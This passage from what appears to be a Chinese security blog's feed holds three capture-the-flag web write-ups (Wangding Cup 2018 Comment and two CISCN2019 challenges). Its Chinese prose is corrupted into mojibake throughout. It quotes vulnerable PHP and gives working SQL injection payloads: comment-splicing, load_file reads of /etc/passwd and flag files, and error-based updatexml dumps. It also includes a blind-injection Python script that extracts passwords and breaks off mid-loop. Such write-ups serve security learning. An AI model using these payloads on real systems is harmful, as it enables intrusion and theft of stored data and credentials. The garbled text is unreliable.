mysql_query($sql);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå³æ˜¯å…³é”®çš„æ³¨å…¥ç‚¹ï¼Œcontentä¼šå–å‡ºæœªè½¬ä¹‰çš„å•å¼•å·è¿›è¡Œé—­åˆ</p><p>å…³é”®æ˜¯å¦‚ä½•æ„é€ ï¼Œè¿™æ˜¯ååˆ†å…³é”®çš„</p><blockquote><p>æ³¨æ„ï¼šè¿™é‡Œçš„contentæ˜¯commendçš„contentï¼Œä¸æ˜¯å¸–å­çš„content</p></blockquote><p>è¿™é‡Œçš„sqlè¯­å¥æ˜¯å¤šè¡Œçš„ï¼Œæ³¨é‡Šéœ€è¦ç”¨å¤šè¡Œæ³¨é‡Šï¼š</p><p>ä»¤category=â€™,content=database(),/<em>ï¼Œåœ¨ç•™è¨€ä¸­è¾“å…¥\</em>/#ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;&#x27;,content=database(),/*&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;*/#&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ„é€ ï¼Œ<code>/**/</code>æ³¨é‡Šæ‰è·¨è¡Œ<code>&#39;</code>ï¼Œ#æ³¨é‡Šæ‰åé¢çš„å•å¼•å·ï¼Œcontentå°±ä¼šæˆåŠŸè¢«æˆ‘ä»¬åŠ«æŒï¼Œæˆ‘ä»¬åœ¨ç•™è¨€åè¯­å¥å°±ä¼šæˆåŠŸæ‰§è¡Œå®Œæˆæ³¨å…¥ã€‚</p><p>ä½†æ˜¯æ³¨åº“åæ—¶å‘ç°æ²¡æœ‰å›æ˜¾ï¼Œä¸€ç•ªå°è¯•â€¦â€¦æ”¾å¼ƒâ€¦â€¦</p><p>load_fileè¯»å–passwdï¼š</p><blockquote><p><a href="https://www.cnblogs.com/songxingzhu/p/6364700.html">https://www.cnblogs.com/songxingzhu/p/6364700.html</a></p></blockquote><img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424155009903.png" alt="image-20210424155009903" style="zoom:80%;" /><p>æœ€ä¸‹é¢æœ‰ä¸€ä¸ªwwwç”¨æˆ·ï¼Œç›®å½•ä¸º/home/wwwï¼Œé»˜è®¤shellä¸ºbin/bashï¼Œç”±æ­¤å¯ä»¥æŸ¥ä¸€ä¸‹è¯¥ç”¨æˆ·çš„shellå†å²ï¼š</p><h4 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">https://blog.csdn.net/u011479200/article/details/86501366</a></p><p><a href="https://blog.csdn.net/chinalinuxzend/article/details/1849419">å‘½ä»¤è®°å½•.bash_history</a></p><p>æŸ¥ä¸‹/home/www/ä¸‹çš„å‘½ä»¤ä½¿ç”¨å†å²ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/ </span><br><span class="line">unzip html.zip </span><br><span class="line">rm -f html.zip </span><br><span class="line">cp -r html /var/www/ </span><br><span class="line"><span class="built_in">cd</span> /var/www/html/ </span><br><span class="line">rm -f .DS_Store </span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>.DS_Storeä¼¼ä¹æ˜¯ä¸€ç§æ³„éœ²ï¼Œåœ¨ç½‘é¡µä¸Šçº¿å‰åˆ æ‰äº†ï¼Œä½†æ˜¯/tmp/htmlä¸­åº”è¯¥æ˜¯å­˜åœ¨çš„ï¼š</p><p>è¯»å–å‘ç°æ˜¯ä¹±ç ä¸”æ˜¾ç¤ºä¸å®Œæ•´ï¼Œç”¨hex()è¯»å–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Bud1</span><br><span class="line">strapIlbootstrapIlocblobF(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½comment.phpIlocblobï¿½(ï¿½ï¿½cssIlocblobR(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½flag_8946e1ff1ee3e40f.phpIlocblobï¿½(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½fontsIlocblobFï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½index.phpIlocblobï¿½ï¿½ï¿½ï¿½jsIlocblobRï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½login.phpIlocblobï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½mysql.phpIlocblobFï¿½ï¿½ï¿½ï¿½ï¿½ï¿½vendorIlocblobï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½write_do.phpIlocblobRï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ @ï¿½ @ï¿½ @ï¿½ @E</span><br></pre></td></tr></table></figure><p>å‘ç°flag_8946e1ff1ee3e40f.phpï¼Œå¯ä»¥ç€æ‰‹è¯»flagäº†â€¦â€¦</p><p>æˆ‘å¯»æ€å“ªä¸ªç›®å½•ä¸‹çš„flagæ–‡ä»¶åº”è¯¥éƒ½ä¸€æ ·ï¼Œç»“æœä¸ä¸€æ ·ï¼Œå¿…é¡»è¯»/var/www/html/ä¸‹é¢çš„â€¦â€¦</p><p><code>category=&#39;,content=hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;)),/*</code></p><p>è·å¾—flagâ€¦â€¦</p><img src="/images/ç½‘é¼æ¯-2018-Comment/image-20210424160546854.png" alt="image-20210424160546854" style="zoom:50%;" /><p>â€¦â€¦tql</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ç½‘é¼æ¯-2018-Comment&quot;&gt;&lt;a href=&quot;#ç½‘é¼æ¯-2018-Comment&quot; class=&quot;headerlink&quot; title=&quot;[ç½‘é¼æ¯ 2018]Comment&quot;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2018]Comment&lt;/h3&gt;&lt;p&gt;å­¦ä¹ äº†ä¸å°‘çŸ¥è¯†â€¦â€¦â€¦â€¦&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk</title>
    <link href="http://example.com/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"/>
    <id>http://example.com/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/</id>
    <published>2021-04-23T09:44:59.000Z</published>
    <updated>2021-04-23T11:08:00.243Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h3><img src="/images/CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk/image-20210423174538565.png" alt="image-20210423174538565" style="zoom:40%;" /><p>æ‘¸ç´¢ä¸€ä¸‹ï¼Œæœ‰æ·»åŠ è®¢å•ï¼ŒæŸ¥æ‰¾è®¢å•ï¼Œåˆ é™¤è®¢å•ï¼Œç¡®è®¤è®¢å•ï¼Œæ›´æ”¹è®¢å•çš„åŠŸèƒ½ï¼š</p><p>indexã€confirmã€deleteã€searchã€changeã€config</p><p>indexé¡µé¢æœ‰æç¤ºï¼š?fileï¼Œç”¨php://è¯»å–ï¼š</p><p>index.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure><p>å…¶ä»–é¡µé¢éƒ½æœ‰é’ˆå¯¹sqlçš„è¿‡æ»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œaddress(åœ°å€)æ²¡æœ‰è¿‡æ»¤â€¦â€¦</p><p>åœ¨æ·»åŠ è®¢å•åŠŸèƒ½ä¸­ï¼ˆconfirm.phpï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$re-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, $user_name, $address, $phone);</span><br></pre></td></tr></table></figure><blockquote><p>bind_paramï¼š</p><p>è¯¥å‡½æ•°ç»‘å®šäº† SQL çš„å‚æ•°ï¼Œä¸”å‘Šè¯‰æ•°æ®åº“å‚æ•°çš„å€¼ã€‚ â€œsssâ€ å‚æ•°åˆ—å¤„ç†å…¶ä½™å‚æ•°çš„æ•°æ®ç±»å‹ã€‚s å­—ç¬¦å‘Šè¯‰æ•°æ®åº“è¯¥å‚æ•°ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>å‚æ•°æœ‰ä»¥ä¸‹å››ç§ç±»å‹:</p><p>i - integerï¼ˆæ•´å‹ï¼‰<br>d - doubleï¼ˆåŒç²¾åº¦æµ®ç‚¹å‹ï¼‰<br>s - stringï¼ˆå­—ç¬¦ä¸²ï¼‰<br>b - BLOBï¼ˆå¸ƒå°”å€¼ï¼‰</p></blockquote><p>è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ç»‘å®šäº†å‚æ•°ä¸ºå­—ç¬¦ä¸²ï¼Œæœ‰æ•ˆé˜²æ­¢äº†sqlæ³¨å…¥â€¦â€¦</p><p>change.phpï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$address = addslashes($_POST[&quot;address&quot;]);</code>å¯¹ä¿®æ”¹å€¼è¿›è¡Œäº†è½¬ä¹‰æ“ä½œâ€¦â€¦</p><p>ç”±äºæŠ¥é”™ä¿¡æ¯æ˜¯å¯ä»¥æ‰“å°å‡ºæ¥çš„ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼š</p><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p><a href="https://blkstone.github.io/2017/11/09/updatexml-sqli/">https://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p><p>åˆ©ç”¨updatexmlçš„ä¸­é—´ä¸åˆè¯­æ³•çš„å‚æ•°æŠ¥é”™å¸¦å‡ºæ•°æ®</p><p>è‡³äºäºŒæ¬¡æ³¨å…¥ï¼Œå¾ˆå¤šwpéƒ½æ²¡è§£é‡Šâ€¦â€¦æˆ‘çŒœæµ‹ä¸€æ³¢â€¦â€¦</p><p>åœ¨æ›´æ–°æ•°æ®æ—¶ï¼Œè™½ç„¶å¯¹ä¿®æ”¹å€¼è¿›è¡Œäº†è½¬ä¹‰æ“ä½œï¼Œä½†ä¸ä¼šå°†<code>\</code>å¸¦å…¥æ•°æ®åº“ï¼Œæ‹¿å‡ºæ—¶ä»æ˜¯<code>&#39;</code>ã€‚</p><p><code>$row = $fetch-&gt;fetch_assoc();</code>æŠ“å–çš„æ˜¯ä¸Šä¸€æ¬¡çš„æ•°æ®</p><p>â€œâ€˜, `old_address`=â€™â€.$row[â€˜addressâ€™]æ˜¯ä¸Šä¸€æ¬¡çš„addressï¼Œè¿™ä½¿å¾— <strong>â€˜</strong> ä¾ç„¶èµ·æ•ˆâ€¦â€¦</p><p>æˆ‘ä»¬å…ˆæ³¨å…¥æŠ¥é”™è¯­å¥ï¼Œå†åœ¨changeéšä¾¿æ›´æ”¹ä¸‹ï¼Œä¸Šæ¬¡æ³¨å…¥è¯­å¥ä¾¿å¼€å§‹å·¥ä½œï¼Œè·å¾—æŠ¥é”™å†…å®¹ï¼Œå¸¦å‡ºæ•°æ®ã€‚</p><p>æ„é€ è¯­å¥ä½¿ç¬¦åˆè¯­æ³•è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())),0x7e),1)#</span><br><span class="line"></span><br><span class="line">address&#x3D;1&#39; where user_id&#x3D;updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;0x75736572)),20,30),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŸ¥äº†ä¸€å¤§æ³¢ä¸œè¥¿ï¼Œä¼¼ä¹æ²¡æœ‰flagâ€¦â€¦?</p><p>åŸé¢˜ç›®å¥½åƒå‘Šè¯‰äº†è¦è¯»æ ¹ç›®å½•çš„flag.txtâ€¦â€¦</p><p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),1,20),0x7e),1)#</code></p><img src="/images/CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk/image-20210423190458532.png" alt="image-20210423190458532" style="zoom:80%;" /><p><code>address=1&#39; where user_id=updatexml(1,concat(0x7e,substr(load_file(&#39;/flag.txt&#39;),20,60),0x7e),1)#</code></p><p>flag{db0fd1ea-0731-4</p><p>b94-ad41-e7e6192643eb}</p><p>å¾—åˆ°äº†flagâ€¦â€¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk&quot;&gt;&lt;a href=&quot;#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 ååŒ—èµ›åŒº Day1 Web</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb</title>
    <link href="http://example.com/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"/>
    <id>http://example.com/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/</id>
    <published>2021-04-23T02:56:01.000Z</published>
    <updated>2021-04-23T14:38:19.416Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h3><p>è¿›å…¥é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼š</p><img src="/images/CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb/image-20210423105739857.png" alt="image-20210423105739857" style="zoom:40%;" /><p>å…¶ä¸­æ¯æ¬¡ç™»å½•çŒ«çŒ«çš„å›¾ç‰‡ä¼šå‘ç”Ÿå˜åŒ–</p><p>æŸ¥çœ‹robots.txtæœ‰æ‰€å‘ç°ï¼š</p><p><code>User-agent: * Disallow: *.php.bak</code></p><p>è¯´æ˜å­˜åœ¨ä»¥.php.bakç»“å°¾çš„æºç å¤‡ä»½â€¦â€¦ä½†å°è¯•ä¸€ä¸‹å‘ç°ä¸æ˜¯indexï¼Œä¹Ÿä¸æ˜¯usersâ€¦â€¦éš¾é“è¦çˆ†ç ´â€¦â€¦</p><p>æŸ¥çœ‹æºç å‘ç°ï¼š</p><p><code>&lt;div class=&quot;avtar&quot;&gt;&lt;img src=&quot;image.php?id=2&quot; width=&quot;200&quot; height=&quot;200&quot;/&gt;&lt;/div&gt;</code></p><p>å­˜åœ¨image.phpâ€¦â€¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><blockquote><p>PHP addslashes() å‡½æ•°</p><p>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ã€‚</p><p>é¢„å®šä¹‰å­—ç¬¦æ˜¯ï¼š</p><ul><li>å•å¼•å·ï¼ˆâ€™ï¼‰</li><li>åŒå¼•å·ï¼ˆâ€ï¼‰</li><li>åæ–œæ ï¼ˆ\ï¼‰</li><li>NULL</li></ul></blockquote><p><code>&#39;</code>ä¼šè¢«è½¬ä¹‰æ‰ï¼Œä½†é…åˆstr_replaceå°±å¯ä»¥äº§ç”Ÿä¸€äº›å¥‡å¦™çš„å˜åŒ–</p><p><code>?id=\0</code>ï¼š<img src="/images/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/image-20210423115233354.png" alt="image-20210423115233354"></p><p>è¿™æ ·å°±å¯ä»¥ä¼ å…¥ä¸€ä¸ªè½¬ä¹‰ç¬¦å·ï¼Œç±»ä¼¼Hgame2021çš„jaliï¼Œè½¬ä¹‰æ‰ä¸€ä¸ª<code>&#39;</code>ï¼Œæ³¨é‡Šæ‰ä¸€ä¸ª<code>&#39;</code>æ¥æ³¨å…¥</p><p><code>?id=\\0&amp;path=or 1=1%23</code>å³ä¸ºï¼š</p><p><code>select * from images where id=&#39;\&#39; or path=&#39;or 1=1#&#39;</code>=&gt;</p><p> =&gt; select * from images where id=â€™<u><strong><em>\â€˜ or path=â€™</em></strong></u>or 1=1#â€™               </p><p> =&gt; select * from images where id=â€™xxxâ€™or 1=1#â€™</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url1 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or if(ord(substr(database(),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># åº“å</span></span><br><span class="line">url2 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># è¡¨å</span></span><br><span class="line">url3 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># åˆ—åï¼Œå› ä¸ºä¸èƒ½ç”¨å•å¼•å·ï¼Œä½¿ç”¨16è¿›åˆ¶ä»£æ›¿ã€‚</span></span><br><span class="line">url4 = <span class="string">&quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\0&amp;path=or &quot;</span> \</span><br><span class="line">       <span class="string">&quot;if(ord(substr((select(password)from(users)),&#123;&#125;,1))&gt;=&#123;&#125;,1,0)%23&quot;</span></span><br><span class="line"><span class="comment"># æ•°æ®</span></span><br><span class="line">url = url4</span><br><span class="line"><span class="comment"># é€‰æ‹©æŸ¥è¯¢è¯­å¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> r &gt; l:</span><br><span class="line">        mid = <span class="built_in">int</span>((l + r + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        pay = url.<span class="built_in">format</span>(x, y)</span><br><span class="line">        response = requests.get(url=pay)</span><br><span class="line">        